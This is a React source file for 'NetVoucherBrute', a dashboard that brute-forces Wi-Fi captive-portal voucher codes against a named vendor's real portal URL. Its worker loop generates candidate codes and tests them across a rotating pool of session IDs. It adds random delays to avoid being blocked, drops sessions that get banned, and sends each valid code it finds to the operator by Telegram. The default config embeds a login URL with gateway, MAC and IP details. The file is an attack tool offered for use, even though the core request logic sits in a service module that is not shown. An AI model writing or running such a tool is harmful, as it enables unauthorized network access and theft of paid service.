

import React, { useState, useEffect, useCallback, useRef } from 'react';
import { 
  Play, Pause, Settings, ShieldAlert, Activity, 
  Wifi, Users, Key, Download, Trash2, Cpu, Type, Hash, AlignLeft,
  Network
} from 'lucide-react';
import ConsoleLog from './components/ConsoleLog';
import StatCard from './components/StatCard';
import { Config, LogEntry, ScanStats, SessionSlot, ValidCode } from './types';
import { fetchSessionId, generateAccessCode, checkCode, sendTelegramAlert } from './services/scannerLogic';

const DEFAULT_CONFIG: Config = {
  targetUrl: 'https://portal-as.ruijienetworks.com',
  telegramBotToken: '',
  telegramChatId: '',
  threadCount: 20,
  simulationMode: true,
  // New Defaults: Mixed (Number + Lowercase)
  useNumbers: true,
  useLowercase: true, 
  codeLength: 6,
  codePrefix: '',
  loginUrl: 'https://portal-as.ruijienetworks.com/auth/wifidogAuth/login/?gw_id=105f025095cc&gw_sn=H1T81SZ001332&gw_address=172.16.200.1&gw_port=2060&ip=172.16.219.79&mac=1a:c3:0e:17:e2:bf&slot_num=0&nasip=192.168.1.97&ssid=VLAN20&ustate=0&mac_req=0&url=https%3A%2F%2Fwww%2Ex%2Ecom%2F&chap_id=%5C340&chap_challenge=%5C003%5C272%5C071%5C251%5C154%5C266%5C314%5C357%5C226%5C202%5C003%5C266%5C226%5C145%5C177%5C225'
};

const MAX_LOGS = 200;

export default function App() {
  // State
  const [isRunning, setIsRunning] = useState(false);
  const [config, setConfig] = useState<Config>(DEFAULT_CONFIG);
  const [showConfig, setShowConfig] = useState(false);
  const [stats, setStats] = useState<ScanStats>({
    attempts: 0,
    validFound: 0,
    sessionsActive: 0,
    startTime: null
  });
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [validCodes, setValidCodes] = useState<ValidCode[]>([]);
  const [activeSessions, setActiveSessions] = useState<SessionSlot[]>([]); // For UI display
  const [rightTab, setRightTab] = useState<'valid' | 'pool'>('valid');
  
  // Refs for async loop management
  const sessionsRef = useRef<SessionSlot[]>([]);
  const isRunningRef = useRef(false);
  const statsRef = useRef(stats);
  
  // Load config from localstorage
  useEffect(() => {
    const saved = localStorage.getItem('netvoucher_config');
    if (saved) {
        try {
            // Merge saved with default to handle new fields
            setConfig({ ...DEFAULT_CONFIG, ...JSON.parse(saved) });
        } catch(e) {}
    }
  }, []);

  useEffect(() => {
    localStorage.setItem('netvoucher_config', JSON.stringify(config));
  }, [config]);

  useEffect(() => {
    statsRef.current = stats;
  }, [stats]);

  const addLog = useCallback((message: string, type: LogEntry['type'] = 'info') => {
    const entry: LogEntry = {
      id: Math.random().toString(36).substr(2, 9),
      timestamp: new Date().toLocaleTimeString(),
      message,
      type
    };
    setLogs(prev => [...prev.slice(-MAX_LOGS), entry]);
  }, []);

  // --- Core Worker Logic ---

  // Session Manager
  const manageSessions = useCallback(async () => {
    if (!isRunningRef.current) return;
    
    // Target 50% of thread count as active sessions
    const targetSessions = Math.max(1, Math.floor(config.threadCount / 2));
    
    if (sessionsRef.current.length < targetSessions) {
      // addLog('Pool low. Fetching new session ID...', 'warning');
      const sid = await fetchSessionId(config);
      
      if (sid) {
        sessionsRef.current.push({
          id: Math.random().toString(36),
          sessionId: sid,
          remainingUses: 40 // Matches Python PER_SESSION_MAX
        });
        addLog(`Session acquired and added to pool [SID: ${sid}]`, 'info');
      } else {
        addLog('Failed to fetch session. Retrying...', 'error');
      }
    }
    
    // Update active count for UI
    setStats(prev => ({...prev, sessionsActive: sessionsRef.current.length}));
    setActiveSessions([...sessionsRef.current]); // Sync for UI display
    
    if (isRunningRef.current) {
        setTimeout(manageSessions, 1000);
    }
  }, [config, addLog]);

  // Worker Loop (Recursive Promise Chain)
  const spawnWorker = useCallback(async (workerId: number) => {
    if (!isRunningRef.current) return;

    if (sessionsRef.current.length === 0) {
      // Wait for sessions
      setTimeout(() => spawnWorker(workerId), 500);
      return;
    }

    // Get a session
    const sessionIndex = Math.floor(Math.random() * sessionsRef.current.length);
    const sessionSlot = sessionsRef.current[sessionIndex];
    
    if (!sessionSlot) {
       setTimeout(() => spawnWorker(workerId), 100);
       return;
    }

    // Try a code - NOW USES CONFIG
    const code = generateAccessCode(config);
    
    // Optional: Log every attempt (can be noisy, but helpful if user wants to see it)
    // addLog(`Checking ${code} on [SID: ${sessionSlot.sessionId}]`, 'info');

    const result = await checkCode(code, sessionSlot.sessionId, config);

    // Update Stats
    setStats(prev => ({
        ...prev,
        attempts: prev.attempts + 1
    }));

    if (result.valid) {
      addLog(`VALID CODE FOUND: ${code} on [SID: ${sessionSlot.sessionId}]`, 'success');
      setValidCodes(prev => [...prev, {
          code,
          timestamp: new Date().toLocaleString(),
          sessionId: sessionSlot.sessionId
      }]);
      setStats(prev => ({...prev, validFound: prev.validFound + 1}));
      
      // Send Telegram
      await sendTelegramAlert(code, sessionSlot.sessionId, config);
    } else if (result.message.includes('timeout') || result.status === 401) {
       addLog(`Session expired/banned [SID: ${sessionSlot.sessionId}]`, 'error');
       // Remove session
       sessionsRef.current = sessionsRef.current.filter(s => s.id !== sessionSlot.id);
       setActiveSessions([...sessionsRef.current]);
    } else {
       // Decrement usage
       sessionSlot.remainingUses--;
       if (sessionSlot.remainingUses <= 0) {
           sessionsRef.current = sessionsRef.current.filter(s => s.id !== sessionSlot.id);
           setActiveSessions([...sessionsRef.current]);
       }
    }

    // Next loop with slight random delay to behave like human/reduce blockage
    const delay = Math.random() * 50; 
    setTimeout(() => spawnWorker(workerId), delay);

  }, [config, addLog]);


  const toggleScan = () => {
    if (isRunning) {
        // Stop
        setIsRunning(false);
        isRunningRef.current = false;
        addLog('Stopping all workers...', 'warning');
    } else {
        // Start
        setIsRunning(true);
        isRunningRef.current = true;
        setStats(prev => ({...prev, startTime: Date.now()}));
        addLog(`Initializing scan with ${config.threadCount} workers...`, 'success');
        
        let modeStr = [];
        if(config.useNumbers) modeStr.push("Numbers");
        if(config.useLowercase) modeStr.push("Lowercase");
        addLog(`Configuration: Length=${config.codeLength}, Mode=[${modeStr.join('+')}]`, 'info');
        
        // Start Session Manager
        manageSessions();

        // Start Workers
        for(let i=0; i < config.threadCount; i++) {
            setTimeout(() => spawnWorker(i), i * 50); // Stagger start
        }
    }
  };

  const downloadResults = () => {
    const content = validCodes.map(v => `${v.timestamp}\t${v.code}\t${v.sessionId}`).join('\n');
    const blob = new Blob([content], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `valid_codes_${Date.now()}.txt`;
    a.click();
  };

  // Calculate speed
  const getSpeed = () => {
    if (!stats.startTime) return 0;
    const seconds = (Date.now() - stats.startTime) / 1000;
    return seconds > 0 ? Math.round(stats.attempts / seconds) : 0;
  };

  return (
    <div className="min-h-screen bg-zinc-950 text-zinc-200 font-sans selection:bg-emerald-500/30">
      
      {/* Navbar */}
      <header className="border-b border-zinc-800 bg-[#0c0c0e]/90 backdrop-blur-md sticky top-0 z-50">
        <div className="max-w-7xl mx-auto px-4 h-16 flex items-center justify-between">
            <div className="flex items-center gap-3">
                <div className="relative">
                    <ShieldAlert className="w-7 h-7 text-emerald-500" />
                    {isRunning && <span className="absolute -top-1 -right-1 w-2.5 h-2.5 bg-emerald-400 rounded-full animate-ping" />}
                </div>
                <div>
                    <h1 className="text-lg font-bold tracking-tight text-white leading-none">NetVoucher<span className="text-emerald-500">Brute</span></h1>
                    <span className="text-[10px] text-zinc-500 font-mono">SECURE ACCESS TOOL V2.0</span>
                </div>
            </div>
            
            <div className="flex items-center gap-3">
                 <div className="hidden md:flex items-center gap-2 px-3 py-1 bg-zinc-900 rounded-full border border-zinc-800">
                    <div className={`w-2 h-2 rounded-full ${isRunning ? 'bg-emerald-500 animate-pulse' : 'bg-red-500'}`} />
                    <span className="text-xs font-mono text-zinc-400">{isRunning ? 'SYSTEM ACTIVE' : 'SYSTEM IDLE'}</span>
                 </div>
                 <button 
                    onClick={() => setShowConfig(!showConfig)}
                    className={`p-2 rounded-lg transition-all flex items-center gap-2 border ${showConfig ? 'bg-zinc-800 text-white border-zinc-600 shadow-lg' : 'text-zinc-400 border-transparent hover:bg-zinc-900'}`}
                 >
                    <Settings className="w-5 h-5" />
                    <span className="text-xs font-bold hidden sm:inline">CONFIG</span>
                 </button>
            </div>
        </div>
      </header>

      <main className="max-w-7xl mx-auto px-4 py-6 grid grid-cols-1 lg:grid-cols-3 gap-6">
        
        {/* Left Column: Controls & Stats */}
        <div className="lg:col-span-2 space-y-6">
            
            {/* Stats Grid */}
            <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                <StatCard 
                    label="Attempts" 
                    value={stats.attempts.toLocaleString()} 
                    icon={<Activity className="w-4 h-4" />} 
                    trend={`${getSpeed()} req/s`}
                />
                <StatCard 
                    label="Valid Codes" 
                    value={stats.validFound} 
                    icon={<Key className="w-4 h-4" />} 
                    color="emerald"
                />
                 <StatCard 
                    label="Active Sessions" 
                    value={stats.sessionsActive} 
                    icon={<Users className="w-4 h-4" />} 
                    color="blue"
                />
                 <StatCard 
                    label="Workers" 
                    value={config.threadCount} 
                    icon={<Cpu className="w-4 h-4" />} 
                />
            </div>

            {/* Configuration Panel (Collapsible) */}
            {showConfig && (
                <div className="bg-zinc-900/80 border border-zinc-800 rounded-xl p-6 animate-in slide-in-from-top-4 backdrop-blur-sm shadow-2xl">
                    <div className="flex items-center justify-between mb-4">
                        <h2 className="text-sm font-bold text-white uppercase tracking-wider flex items-center gap-2">
                            <Settings className="w-4 h-4 text-emerald-500" /> Scanner Configuration
                        </h2>
                    </div>
                    
                    <div className="space-y-6">
                        {/* Section 1: Connection & Workers */}
                        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                            <div className='md:col-span-2'>
                                <label className="block text-xs text-zinc-500 mb-1 font-mono uppercase">Login URL (Source)</label>
                                <input 
                                    type="text" 
                                    className="w-full bg-zinc-950 border border-zinc-700 rounded-md p-2.5 text-sm text-zinc-300 focus:border-emerald-500 focus:ring-1 focus:ring-emerald-500/50 focus:outline-none font-mono transition-all"
                                    value={config.loginUrl}
                                    onChange={e => setConfig({...config, loginUrl: e.target.value})}
                                    disabled={isRunning}
                                    placeholder="https://..."
                                />
                                <p className="text-[10px] text-zinc-600 mt-1">System extracts Session ID from this URL parameters.</p>
                            </div>
                            <div>
                                <label className="block text-xs text-zinc-500 mb-1 font-mono uppercase">Target Base URL</label>
                                <input 
                                    type="text" 
                                    className="w-full bg-zinc-950 border border-zinc-700 rounded-md p-2.5 text-sm text-zinc-300 focus:border-emerald-500 focus:outline-none font-mono transition-all"
                                    value={config.targetUrl}
                                    onChange={e => setConfig({...config, targetUrl: e.target.value})}
                                    disabled={isRunning}
                                />
                            </div>
                            <div>
                                <label className="block text-xs text-zinc-500 mb-1 font-mono uppercase">Thread Count</label>
                                <input 
                                    type="number" 
                                    className="w-full bg-zinc-950 border border-zinc-700 rounded-md p-2.5 text-sm text-zinc-300 focus:border-emerald-500 focus:outline-none font-mono transition-all"
                                    value={config.threadCount}
                                    onChange={e => setConfig({...config, threadCount: parseInt(e.target.value) || 1})}
                                    disabled={isRunning}
                                />
                            </div>
                        </div>

                        {/* Section 2: Character Set & Range */}
                        <div className="bg-black/20 p-4 rounded-lg border border-zinc-800">
                            <label className="block text-xs font-bold text-zinc-400 mb-3 uppercase tracking-wider flex items-center gap-2">
                                <Hash className="w-3 h-3" /> Code Pattern
                            </label>
                            
                            <div className="grid grid-cols-1 md:grid-cols-3 gap-3 mb-4">
                                {/* Preset Buttons */}
                                <button 
                                    onClick={() => !isRunning && setConfig({...config, useNumbers: true, useLowercase: false})}
                                    className={`flex flex-col items-center justify-center p-3 rounded-md border transition-all ${config.useNumbers && !config.useLowercase ? 'bg-emerald-500/10 border-emerald-500 text-emerald-400' : 'bg-zinc-900 border-zinc-700 text-zinc-500 hover:border-zinc-600'}`}
                                >
                                    <span className="text-lg font-bold">123456</span>
                                    <span className="text-[10px] font-mono uppercase mt-1">Numbers Only</span>
                                </button>
                                
                                <button 
                                    onClick={() => !isRunning && setConfig({...config, useNumbers: false, useLowercase: true})}
                                    className={`flex flex-col items-center justify-center p-3 rounded-md border transition-all ${!config.useNumbers && config.useLowercase ? 'bg-emerald-500/10 border-emerald-500 text-emerald-400' : 'bg-zinc-900 border-zinc-700 text-zinc-500 hover:border-zinc-600'}`}
                                >
                                    <span className="text-lg font-bold">abcde</span>
                                    <span className="text-[10px] font-mono uppercase mt-1">Lowercase Only</span>
                                </button>

                                <button 
                                    onClick={() => !isRunning && setConfig({...config, useNumbers: true, useLowercase: true})}
                                    className={`relative flex flex-col items-center justify-center p-3 rounded-md border transition-all ${config.useNumbers && config.useLowercase ? 'bg-emerald-500/20 border-emerald-400 text-emerald-300 shadow-[0_0_15px_rgba(16,185,129,0.15)]' : 'bg-zinc-900 border-zinc-700 text-zinc-500 hover:border-zinc-600'}`}
                                >
                                    <div className="flex items-baseline gap-1">
                                        <span className="text-lg font-bold">123</span>
                                        <span className="text-lg font-bold">abc</span>
                                    </div>
                                    <span className="text-[10px] font-mono uppercase mt-1">Mixed (0-9 + a-z)</span>
                                    {config.useNumbers && config.useLowercase && <div className="absolute top-2 right-2 w-1.5 h-1.5 bg-emerald-400 rounded-full animate-pulse"></div>}
                                </button>
                            </div>

                            <div className="grid grid-cols-2 gap-4">
                                <div>
                                    <label className="block text-xs text-zinc-500 mb-1 flex items-center gap-1 font-mono uppercase">
                                        <AlignLeft className="w-3 h-3" /> Code Length
                                    </label>
                                    <input 
                                        type="number" 
                                        min="1" max="20"
                                        className="w-full bg-zinc-900 border border-zinc-700 rounded-md p-2 text-sm text-zinc-300 focus:border-emerald-500 focus:outline-none font-mono"
                                        value={config.codeLength}
                                        onChange={e => setConfig({...config, codeLength: parseInt(e.target.value) || 6})}
                                        disabled={isRunning}
                                    />
                                </div>
                                <div>
                                    <label className="block text-xs text-zinc-500 mb-1 font-mono uppercase">Prefix (Optional)</label>
                                    <input 
                                        type="text" 
                                        placeholder="e.g. WiFi"
                                        className="w-full bg-zinc-900 border border-zinc-700 rounded-md p-2 text-sm text-zinc-300 focus:border-emerald-500 focus:outline-none font-mono"
                                        value={config.codePrefix}
                                        onChange={e => setConfig({...config, codePrefix: e.target.value})}
                                        disabled={isRunning}
                                    />
                                </div>
                            </div>
                        </div>

                        {/* Section 3: Telegram */}
                        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                            <div>
                                <label className="block text-xs text-zinc-500 mb-1 font-mono uppercase">Telegram Bot Token</label>
                                <input 
                                    type="password" 
                                    className="w-full bg-zinc-950 border border-zinc-700 rounded-md p-2.5 text-sm text-zinc-300 focus:border-emerald-500 focus:outline-none font-mono"
                                    value={config.telegramBotToken}
                                    onChange={e => setConfig({...config, telegramBotToken: e.target.value})}
                                    placeholder="123456:ABC-..."
                                />
                            </div>
                            <div>
                                <label className="block text-xs text-zinc-500 mb-1 font-mono uppercase">Telegram Chat ID</label>
                                <input 
                                    type="text" 
                                    className="w-full bg-zinc-950 border border-zinc-700 rounded-md p-2.5 text-sm text-zinc-300 focus:border-emerald-500 focus:outline-none font-mono"
                                    value={config.telegramChatId}
                                    onChange={e => setConfig({...config, telegramChatId: e.target.value})}
                                    placeholder="12345678"
                                />
                            </div>
                        </div>
                    </div>
                    
                    <div className="mt-6 flex items-center gap-2 p-3 bg-zinc-950/50 rounded-lg border border-zinc-800">
                         <input 
                            type="checkbox" 
                            id="simMode"
                            checked={config.simulationMode}
                            onChange={(e) => setConfig({...config, simulationMode: e.target.checked})}
                            disabled={isRunning}
                            className="w-4 h-4 accent-emerald-500 bg-zinc-800 border-zinc-700 rounded cursor-pointer"
                         />
                         <label htmlFor="simMode" className="text-sm text-zinc-400 select-none cursor-pointer flex-1">
                            Enable Simulation Mode <span className="text-xs text-zinc-600 block sm:inline">(Safe mode for UI testing)</span>
                         </label>
                    </div>
                </div>
            )}

            {/* Main Action Button */}
            <button
                onClick={toggleScan}
                className={`w-full py-5 rounded-xl font-bold text-lg tracking-widest shadow-xl transition-all flex items-center justify-center gap-3 border ${
                    isRunning 
                    ? 'bg-red-500/5 text-red-500 border-red-500/50 hover:bg-red-500/10' 
                    : 'bg-emerald-600 hover:bg-emerald-500 text-white shadow-emerald-500/20 border-emerald-500/50 hover:border-emerald-400'
                }`}
            >
                {isRunning ? (
                    <><Pause className="w-5 h-5 fill-current" /> STOP OPERATION</>
                ) : (
                    <><Play className="w-5 h-5 fill-current" /> INITIATE SCAN</>
                )}
            </button>

            {/* Console Log */}
            <div className="h-96">
                <ConsoleLog logs={logs} />
            </div>

        </div>

        {/* Right Column: Results & Active Pool */}
        <div className="space-y-6">
            <div className="bg-zinc-900/80 backdrop-blur border border-zinc-800 rounded-xl overflow-hidden flex flex-col h-[calc(100vh-8rem)] sticky top-24 shadow-2xl">
                
                {/* Tabs */}
                <div className="flex border-b border-zinc-800 bg-zinc-950/50">
                    <button 
                        onClick={() => setRightTab('valid')}
                        className={`flex-1 py-4 text-[11px] font-bold uppercase tracking-widest flex items-center justify-center gap-2 transition-colors ${rightTab === 'valid' ? 'bg-zinc-800/50 text-white border-b-2 border-emerald-500' : 'text-zinc-500 hover:bg-zinc-800/30'}`}
                    >
                        <Key className="w-3.5 h-3.5" /> Valid
                        {validCodes.length > 0 && <span className="bg-emerald-500/20 text-emerald-500 px-1.5 py-0.5 rounded text-[10px]">{validCodes.length}</span>}
                    </button>
                    <button 
                        onClick={() => setRightTab('pool')}
                        className={`flex-1 py-4 text-[11px] font-bold uppercase tracking-widest flex items-center justify-center gap-2 transition-colors ${rightTab === 'pool' ? 'bg-zinc-800/50 text-white border-b-2 border-blue-500' : 'text-zinc-500 hover:bg-zinc-800/30'}`}
                    >
                        <Network className="w-3.5 h-3.5" /> Active Pool
                        {activeSessions.length > 0 && <span className="bg-blue-500/20 text-blue-500 px-1.5 py-0.5 rounded text-[10px]">{activeSessions.length}</span>}
                    </button>
                </div>

                {/* Content */}
                {rightTab === 'valid' && (
                    <>
                        <div className="p-3 border-b border-zinc-800 flex justify-between items-center bg-zinc-900/30">
                            <span className="text-[10px] text-zinc-500 font-mono uppercase">Captured Codes</span>
                            <div className="flex gap-1">
                                {validCodes.length > 0 && (
                                    <>
                                        <button onClick={() => setValidCodes([])} className="p-1.5 hover:bg-red-500/20 rounded text-zinc-500 hover:text-red-400 transition-colors" title="Clear All">
                                            <Trash2 className="w-3.5 h-3.5" />
                                        </button>
                                        <button onClick={downloadResults} className="p-1.5 hover:bg-emerald-500/20 rounded text-zinc-500 hover:text-emerald-400 transition-colors" title="Download">
                                            <Download className="w-3.5 h-3.5" />
                                        </button>
                                    </>
                                )}
                            </div>
                        </div>
                        <div className="flex-1 overflow-y-auto p-3 space-y-2 custom-scrollbar">
                            {validCodes.length === 0 ? (
                                <div className="h-full flex flex-col items-center justify-center text-zinc-600 gap-3">
                                    <div className="w-12 h-12 rounded-full bg-zinc-900/50 border border-zinc-800 flex items-center justify-center">
                                        <Key className="w-5 h-5 opacity-30" />
                                    </div>
                                    <span className="text-xs font-mono opacity-50">No valid codes found yet.</span>
                                </div>
                            ) : (
                                validCodes.map((code, idx) => (
                                    <div key={idx} className="bg-gradient-to-r from-emerald-900/10 to-zinc-900 border border-emerald-500/30 p-3 rounded-lg group hover:border-emerald-500 transition-all relative overflow-hidden">
                                        <div className="absolute top-0 right-0 w-8 h-8 bg-emerald-500/10 rounded-bl-xl"></div>
                                        <div className="flex justify-between items-center mb-1">
                                            <span className="text-xl font-mono font-bold text-white tracking-widest drop-shadow-[0_0_8px_rgba(16,185,129,0.5)]">{code.code}</span>
                                        </div>
                                        <div className="flex flex-col gap-1 mt-2">
                                            <div className="text-[10px] font-mono text-zinc-500 flex items-center gap-1">
                                                <div className="w-1 h-1 bg-zinc-600 rounded-full"></div>
                                                SID: <span className="text-zinc-400 select-all">{code.sessionId.substring(0, 16)}...</span>
                                            </div>
                                            <div className="text-[10px] font-mono text-zinc-600 text-right">
                                                {code.timestamp}
                                            </div>
                                        </div>
                                    </div>
                                ))
                            )}
                        </div>
                    </>
                )}

                {rightTab === 'pool' && (
                    <div className="flex-1 overflow-y-auto p-3 space-y-2 custom-scrollbar">
                        {activeSessions.length === 0 ? (
                            <div className="h-full flex flex-col items-center justify-center text-zinc-600 gap-3">
                                <div className="w-12 h-12 rounded-full bg-zinc-900/50 border border-zinc-800 flex items-center justify-center">
                                    <Network className="w-5 h-5 opacity-30" />
                                </div>
                                <span className="text-xs font-mono opacity-50">Pool is empty or idle.</span>
                            </div>
                        ) : (
                            activeSessions.map((session, idx) => (
                                <div key={session.id} className="bg-zinc-950/50 border border-zinc-800 p-3 rounded-lg hover:border-blue-500/30 transition-colors group">
                                    <div className="flex justify-between items-start mb-2">
                                        <span className="text-[10px] font-mono text-blue-400 break-all select-all">{session.sessionId}</span>
                                    </div>
                                    <div className="flex items-center gap-2">
                                        <div className="flex-1 h-1.5 bg-zinc-800 rounded-full overflow-hidden">
                                            <div 
                                                className={`h-full rounded-full transition-all duration-500 ${session.remainingUses < 10 ? 'bg-red-500' : 'bg-blue-500'}`}
                                                style={{ width: `${(session.remainingUses / 40) * 100}%` }}
                                            />
                                        </div>
                                        <span className="text-[10px] font-mono text-zinc-500 min-w-[35px] text-right">
                                            {session.remainingUses} left
                                        </span>
                                    </div>
                                </div>
                            ))
                        )}
                    </div>
                )}
                
            </div>
        </div>

      </main>
    </div>
  );
}